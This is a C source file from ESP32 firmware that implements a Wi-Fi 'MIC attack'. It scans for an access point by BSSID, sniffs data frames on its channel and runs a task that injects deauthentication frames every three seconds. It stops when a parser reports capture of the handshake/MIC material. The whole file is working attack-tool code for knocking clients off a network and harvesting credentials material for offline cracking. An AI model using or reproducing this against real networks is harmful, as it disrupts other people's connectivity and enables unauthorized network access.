/*
 * @file arma_mic.c
 * @author johndeweyzxc (johndewey02003@gmail.com)
 * @brief Implementation of methods for orchestrating the MIC attack
 */

#include "arma_mic.h"

#include <stdio.h>
#include <string.h>

#include "arma_deauth.h"
#include "arma_output.h"
#include "arma_utils.h"
#include "esp_err.h"
#include "esp_event.h"
#include "frame_parser_interface.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "wifi_ctl_interface.h"

ESP_EVENT_DECLARE_BASE(ARMAMENT_ATTACK_STATUS_EVENT_BASE);
static uint8_t u_target_bssid[6];
static char c_target_bssid[12];
static TaskHandle_t mic_deauth_inject_task_handle = NULL;

void arma_mic_set_target(char *target_bssid) {
  memcpy(c_target_bssid, target_bssid, 12);

  for (uint8_t i = 0; i < 6; i++) {
    uint8_t s1 = target_bssid[i + i];
    uint8_t s2 = target_bssid[i + i + 1];
    u_target_bssid[i] = convert_to_uint8_t(s1, s2);
  }
  printf(
      "arma_mic.arma_mic_set_target > Target set AP: "
      "%02X%02X%02X%02X%02X%02X\n",
      u_target_bssid[0], u_target_bssid[1], u_target_bssid[2],
      u_target_bssid[3], u_target_bssid[4], u_target_bssid[5]);
}

void mic_notif(void *args, esp_event_base_t event_base, int32_t event_id,
               void *event_data) {
  arma_atk_event_data_t *notification_data;
  notification_data = (arma_atk_event_data_t *)event_data;

  if (notification_data->atk_context == MIC_BASED) {
    arma_mic_finishing_sequence();
    output_success_mic_attack(u_target_bssid);
  }
}

void arma_mic_notif_event_register() {
  ESP_ERROR_CHECK(esp_event_handler_register(
      ARMAMENT_ATTACK_STATUS_EVENT_BASE, ATK_STATS_EVENT_ID, &mic_notif, NULL));
  printf("arma_mic.arma_mic_notif_event_register > Registered mic_notif\n");
}

void arma_mic_notif_event_unregister() {
  ESP_ERROR_CHECK(esp_event_handler_unregister(
      ARMAMENT_ATTACK_STATUS_EVENT_BASE, ATK_STATS_EVENT_ID, &mic_notif));
  printf("arma_mic.arma_mic_notif_event_unregister > Unregistered mic_notif\n");
}

void arma_mic_delete_task_deauth_inject() {
  if (mic_deauth_inject_task_handle != NULL) {
    vTaskDelete(mic_deauth_inject_task_handle);
    mic_deauth_inject_task_handle = NULL;
    printf(
        "arma_mic.arma_mic_delete_task_deauth_inject > Task "
        "arma_mic_inject_deauth was deleted\n");
  }
}

void arma_mic_finishing_sequence() {
  output_mic_finishing_sequence();
  frame_parser_unregister_data_frame_handler();
  frame_parser_clear_target_parameter();
  arma_mic_notif_event_unregister();
  wifi_sniffer_stop();
  arma_mic_delete_task_deauth_inject();
}

void arma_mic_inject_deauth() {
  printf(
      "arma_mic.arma_mic_inject_deauth > Task arma_mic_inject_deauth was "
      "created\n");
  output_mic_operation_started(u_target_bssid);
  int current_time = 0;

  while (1) {
    vTaskDelay(1000 / portTICK_PERIOD_MS);
    if (current_time % 3 == 0) {
      printf("arma_mic.arma_mic_inject_deauth > Injecting deauth\n");
      arma_deauth_inject();
    }
    output_mic_deauth_status(current_time);
    current_time++;
  }
}

void arma_mic_launching_sequence(uint8_t channel) {
  output_deauth_launching_sequence();
  frame_parser_set_target_parameter(u_target_bssid, PARSE_MIC);
  frame_parser_register_data_frame_handler();
  arma_mic_notif_event_register();
  wifi_sniffer_start();
  wifi_set_filter(DATA);
  wifi_set_channel(channel);
  arma_deauth_set_target(c_target_bssid);
  load_deauth_payload();
  xTaskCreatePinnedToCore(arma_mic_inject_deauth, TMDI_NAME, TMDI_STACK_SIZE,
                          NULL, TMDI_PRIORITY, &mic_deauth_inject_task_handle,
                          TMDI_CORE_ID);
}

void arma_mic(char *target_bssid) {
  arma_mic_set_target(target_bssid);
  wifi_scan_aps();

  ap_list_from_scan_t *ap_list = wifi_get_scanned_aps();
  wifi_ap_record_t *ap_records = ap_list->ap_record_list;
  uint16_t total_scanned_aps = ap_list->count;
  printf("arma_mic.arma_mic > Found %u APs\n", total_scanned_aps);

  uint8_t found_target_ap = 0;
  uint8_t index_of_target_ap = 0;
  for (uint16_t i = 0; i < total_scanned_aps; i++) {
    wifi_ap_record_t ap_record = ap_records[i];
    output_ap_info(&ap_record);

    if (memcmp(ap_record.bssid, u_target_bssid, 6) == 0) {
      found_target_ap = 1;
      index_of_target_ap = i;
    }
  }

  if (found_target_ap == 1) {
    wifi_ap_record_t ap_record = ap_records[index_of_target_ap];
    uint8_t channel = ap_record.primary;

    printf("arma_mic.arma_mic > Target AP channel: %u\n", channel);
    arma_mic_launching_sequence(channel);
  } else if (found_target_ap == 0) {
    output_failed_mic_attack(u_target_bssid);
  }
}